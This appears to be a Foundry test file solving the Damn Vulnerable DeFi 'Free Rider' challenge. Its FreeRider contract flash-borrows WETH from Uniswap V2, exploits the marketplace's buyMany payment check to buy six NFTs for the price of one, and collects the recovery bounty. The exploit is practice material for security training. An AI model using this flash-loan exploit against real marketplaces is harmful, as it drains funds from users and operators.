// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../src/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../src/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "builds/uniswap/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
            player,
            address(nft),
            recoveryManagerOwner,
            BOUNTY
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(
            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
        );
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        // as we'll use flashswap, let's use a separate contract
        FreeRider freeRider = new FreeRider(
            uniswapPair,
            marketplace,
            recoveryManager,
            nft,
            weth
        );
        freeRider.recover(NFT_PRICE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(
                address(recoveryManager),
                recoveryManagerOwner,
                tokenId
            );
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

contract FreeRider is Test, IERC721Receiver {
    // some variables
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;
    WETH weth;
    address owner;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        DamnValuableNFT _nft,
        WETH _weth
    ) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        weth = _weth;
        owner = msg.sender;
        console.log("Starting balance", address(this).balance);
    }

    function recover(uint256 amountToBorrow) public {
        // borrowing weth via the uniswap pair contract
        // --> token0 = weth and token1 = token as stated above
        (uint256 amount0Out, uint256 amount1Out) = (amountToBorrow, uint256(0));
        console.log("Amount of WETH to borrow via flashswap", amountToBorrow);
        bytes memory data = abi.encode(address(this), msg.sender);
        uniswapPair.swap(amount0Out, amount1Out, address(this), data);
        (bool success, ) = owner.call{value: address(this).balance}(
            abi.encode("you did it ;)")
        );
        console.log("Player call result:", success);
        console.log("Final player balance", address(owner).balance);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // unwrapping WETH to ETH as we need to pay in ETH
        weth.withdraw(amount0);

        // checking balance
        console.log(
            "ETH balance after WETH flashswap and unwrapping",
            address(this).balance
        );

        // buy all 6 NFTs for the price of one
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        console.log("Buying multiple NFTs...");
        marketplace.buyMany{value: amount0}(tokenIds);

        // check balance before recovery
        uint256 currentBalance = address(this).balance;
        console.log("Current ETH balance", currentBalance);

        // send NFTs to recovery
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                abi.encode(address(this))
            );
        }
        console.log("NFTs transfered to recoveryManager!");

        // check current balance
        uint256 expectedBalance = currentBalance + 45 ether;

        // cash in premium
        assertEq(
            address(this).balance,
            expectedBalance,
            "Not expected balance"
        );
        console.log("Current balance after bounty", address(this).balance);

        // pay flashswap back
        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;
        console.log("Paying back amount of WETH to uniswap", amountToRepay);

        // wrap ETH to WETH
        weth.deposit{value: amountToRepay}();
        weth.approve(address(uniswapPair), amountToRepay);
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
